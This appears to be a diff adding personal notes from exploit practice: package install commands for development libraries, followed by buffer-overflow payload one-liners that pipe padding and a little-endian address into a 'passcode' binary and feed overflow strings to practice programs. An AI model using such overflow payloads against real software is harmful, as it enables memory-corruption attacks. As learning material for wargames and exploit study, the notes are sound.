@@ -1,0 +1,19 @@
+sudo apt-get install libboost-all-dev
+
+sudo apt-get install libcapstone-dev
+
+sudo apt-get install qt-sdk
+
+sudo apt-get install libglib2.0-dev
+
+apt-get install libglib2.0-dev zlib1g-dev
+
+$ python -c "print('a'*96+'\x00\xa0\x04\x08'+'\n'+'134514147\n')" | ./passcode
+
+$ ./bof $(python -c 'print "A" * 30')
+
+$ ./cppapplication_2 $(python -c 'print "\x52\x52\x52\x52" ')
+
+$ ./cppapplication_2 $(python -c 'print "B"*10+"\x52\x52\x52\x52"+"A"*10')
+
+
